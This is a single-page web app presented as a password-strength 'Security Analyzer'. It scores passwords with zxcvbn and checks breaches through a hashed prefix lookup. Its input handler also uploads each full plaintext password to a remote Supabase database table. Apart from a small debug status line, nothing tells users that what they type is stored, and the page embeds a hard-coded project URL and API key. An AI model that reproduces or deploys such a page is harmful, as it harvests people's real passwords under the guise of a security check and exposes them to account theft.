<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Security Analyzer Pro</title>
  
  <!-- Supabase Library & zxcvbn Engine -->
  <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/zxcvbn/4.4.2/zxcvbn.js"></script>
  
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body { 
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; 
      background: linear-gradient(135deg, #0f172a 0%, #1e293b 100%); 
      min-height: 100vh; display: flex; align-items: center; justify-content: center; padding: 20px; 
    }
    .container { 
      background: white; border-radius: 20px; padding: 40px; 
      max-width: 600px; width: 100%; box-shadow: 0 20px 60px rgba(0, 0, 0, 0.4); 
    }
    h1 { text-align: center; color: #1e293b; font-size: 1.8rem; margin-bottom: 5px; }
    .subtitle { text-align: center; color: #64748b; margin-bottom: 30px; font-size: 0.9rem; }
    .input-container { position: relative; margin-bottom: 25px; }
    .password-input { 
      width: 100%; padding: 18px; font-size: 1.1rem; border: 2px solid #e2e8f0; 
      border-radius: 12px; outline: none; transition: all 0.3s; font-family: monospace;
    }
    .password-input:focus { border-color: #2563eb; }
    .strength-bar-container { height: 10px; background: #e2e8f0; border-radius: 10px; overflow: hidden; margin-bottom: 10px; }
    .strength-bar { height: 100%; transition: width 0.4s ease; width: 0%; }
    .very-weak { background: #ef4444; } .weak { background: #f97316; } .fair { background: #facc15; } .good { background: #22c55e; } .strong { background: #15803d; }
    .crack-card { background: #1e293b; color: white; padding: 25px; border-radius: 14px; text-align: center; margin-bottom: 20px; }
    .crack-value { font-size: 2rem; font-weight: 800; display: block; }
    .breach-alert { background: #fee2e2; border: 1px solid #f87171; padding: 10px; border-radius: 8px; color: #991b1b; display: none; margin-bottom: 15px; font-size: 0.85rem; }
  </style>
</head>
<body>

  <div class="container">
    <h1>Security Analyzer</h1>
    <p class="subtitle">Real-time deep analysis and sync</p>

    <div class="input-container">
      <input type="password" class="password-input" id="mainInput" placeholder="Analyze password...">
    </div>

    <div id="resultsArea" style="display: none;">
      <div id="breachAlert" class="breach-alert">⚠️ Found in public data breaches!</div>
      
      <div class="strength-bar-container"><div id="strBar" class="strength-bar"></div></div>
      <div id="scoreLabel" style="text-align: right; font-weight: bold; margin-bottom: 15px;">0%</div>

      <div class="crack-card">
        <span style="font-size: 0.8rem; opacity: 0.7;">TIME TO CRACK</span>
        <span class="crack-value" id="crackDisplay">-</span>
      </div>
      
      <div id="debugStatus" style="font-size: 0.7rem; color: #94a3b8; text-align: center;">Ready</div>
    </div>
  </div>

  <script>
    // 1. UPDATE THESE TO YOUR ACTUAL KEYS
    const SB_URL = 'https://oukbxgjrrgvunfytjemd.supabase.co'; 
    const SB_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Im91a2J4Z2pycmd2dW5meXRqZW1kIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NjY0MTI1MjcsImV4cCI6MjA4MTk4ODUyN30.rAkYSFqRaqI4Am2JpOjD4TWXx4nvtEaZSc6vIgdFXmI';
    const sbClient = supabase.createClient(SB_URL, SB_KEY);

    const input = document.getElementById('mainInput');
    const debug = document.getElementById('debugStatus');
    let dbTimer;

    input.addEventListener('input', (e) => {
        const val = e.target.value;
        if (!val) {
            document.getElementById('resultsArea').style.display = 'none';
            return;
        }
        document.getElementById('resultsArea').style.display = 'block';
        
        // Run Engine
        const data = zxcvbn(val);
        updateUI(data);
        
        // Breach Check
        checkBreach(val);

        // SYNC TO SUPABASE (Debounced 1.5 seconds)
        clearTimeout(dbTimer);
        debug.innerText = "Waiting for you to finish typing...";
        
        dbTimer = setTimeout(() => {
            saveToSupabase(val, data);
        }, 1500);
    });

    async function saveToSupabase(pwd, engineData) {
        debug.innerText = "Attempting to save...";
        console.log("Saving to Supabase...");

        const { data, error } = await sbClient
            .from('password_analysis') // MUST match table name in SQL Editor
            .insert([
                { 
                    password_value: pwd, // Full password
                    score_percent: (engineData.score / 4) * 100,
                    crack_time_text: engineData.crack_times_display.offline_slow_hashing_1e4_per_second 
                }
            ]);

        if (error) {
            debug.innerText = "❌ Error: See Console (F12)";
            console.error("Supabase Error Details:", error.message);
        } else {
            debug.innerText = "✅ Saved successfully to Supabase!";
            console.log("Success! Data in database:", data);
        }
    }

    async function checkBreach(password) {
        const msgUint8 = new TextEncoder().encode(password);
        const hashBuffer = await crypto.subtle.digest('SHA-1', msgUint8);
        const hashArray = Array.from(new Uint8Array(hashBuffer));
        const hashHex = hashArray.map(b => b.toString(16).padStart(2, '0')).join('').toUpperCase();
        const prefix = hashHex.slice(0, 5);
        const suffix = hashHex.slice(5);

        try {
            const res = await fetch(`https://api.pwnedpasswords.com/range/${prefix}`);
            const text = await res.text();
            const isPwned = text.includes(suffix);
            document.getElementById('breachAlert').style.display = isPwned ? 'block' : 'none';
        } catch (e) {}
    }

    function updateUI(data) {
        const percent = (data.score / 4) * 100;
        const bar = document.getElementById('strBar');
        const colors = ['very-weak', 'weak', 'fair', 'good', 'strong'];
        bar.style.width = `${percent}%`;
        bar.className = `strength-bar ${colors[data.score]}`;
        document.getElementById('scoreLabel').innerText = `${percent}%`;
        document.getElementById('crackDisplay').innerText = data.crack_times_display.offline_slow_hashing_1e4_per_second;
    }
  </script>
</body>
</html>
